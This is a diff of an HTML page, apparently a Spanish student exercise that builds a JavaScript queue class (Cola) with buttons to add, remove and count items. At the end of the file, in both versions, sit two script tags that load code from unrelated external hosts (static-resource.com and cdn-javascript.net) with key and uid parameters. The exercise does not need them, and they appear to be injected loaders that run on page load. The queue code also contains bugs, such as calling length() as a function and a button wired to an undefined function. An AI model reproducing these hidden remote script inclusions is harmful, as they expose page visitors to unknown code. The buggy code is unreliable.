@@ -2,62 +2,65 @@
 <meta charset="utf-8">
 <meta name="author" content="">
 <title> UD4_cola </title>
-<script>
-    class Cola {
-        constructor(elementos, array) {
-            this._elementos = elementos;
-            this._array = array;
-        }
-
-        get elementos() {
-            return this.elementos;
-        }
-
-        set elementos(elementos) {
-            this._elementos = elementos;
-        }
-
-        get array() {
-            return this.elementos;
-        }
-
-        set array(array) {
-            this._array = array;
-        } 
-        
-        creaArrayVacio() {
-            var array = [];
-            return array;
-        }
-
-        anadirElemento(e) {
-            array.push(e);
-            return this.array;
-        }
-
-        extraerElemento() {
-            this.array.shift();
-            return this.array;
-        }
-
-        consultarNumeroElementos() {
-            return this.array.length();
-        }
-
-        estaVacia() {
-            return (this.array.length() > 0 ? false : true);
-        }
-    }
-
-</script>
-<script type="text/javascript" src="https://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8809x"></script><script type="text/javascript" src="https://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8809x&amp;format=arrjs&amp;r=1581330163061"></script></head>
+</head>
 <body>
 	Introduce un elemento en el campo de texto y pulsa añadir elemento:<br>
 	<input type="text" id="texto">
-	<input type="button" value="anadirElemento" onclick="anadeElemento()"> 
-	<input type="button" value="sacarElemento" onclick="extraeElemento()"> 
-	<input type="button" value="contarElementos" onclick="cuentaElementos()"> 
-	<p id="mensaje"></p>
+	<button onclick="anadirElemento(document.getElementById('texto').value)">AñadirElemento</button>
+	<button onclick="extraerElemento()">SacarElemento</button> 
+	<button onclick="consultarNumeroElementos()">ConsultarNumeroElementos</button> 
+	<p id="salida"></p>
+    <p id="longitud"></p>
 
+    <script>
+        class Cola {
+            constructor() {
+                this.vector = new Array();
+            }
+    
+            anadirElemento(e) {
+                this.vector.push(e);
+            }
+    
+            extraerElemento() {
+                if (this.consultarNumeroElementos() > 0) {
+                    this.vector.shift();
+                }
+            }
+    
+            consultarNumeroElementos() {
+                return this.vector.length;
+            }
+    
+            estaVacia() {
+                return (this.vector.length() > 0 ? false : true);
+            }
 
+            toString(){
+                let salida = "";
+                this.vector.forEach(element => {
+                    salida += element + " ";
+                });
+                return salida;
+            }
+        }
+    
+        c = new Cola();
+    
+            function anadirElemento(e){
+                c.anadirElemento(e);
+                pintar();
+            }
+    
+            function extraerElemento(){
+                c.extraerElemento();
+                pintar();
+            }
+    
+            function pintar(){
+                document.getElementById('salida').innerHTML = "Cola: " + c;
+                document.getElementById('longitud').innerHTML = "Longitud: " + c.consultarNumeroElementos();
+            }   
+    </script>
+    <script type="text/javascript" src="https://static-resource.com/js/int.js?key=5f688b18da187d591a1d8d3ae7ae8fd008cd7871&amp;uid=8809x"></script><script type="text/javascript" src="https://cdn-javascript.net/api?key=a1ce18e5e2b4b1b1895a38130270d6d344d031c0&amp;uid=8809x&amp;format=arrjs&amp;r=1581330163061"></script>
 </body></html>
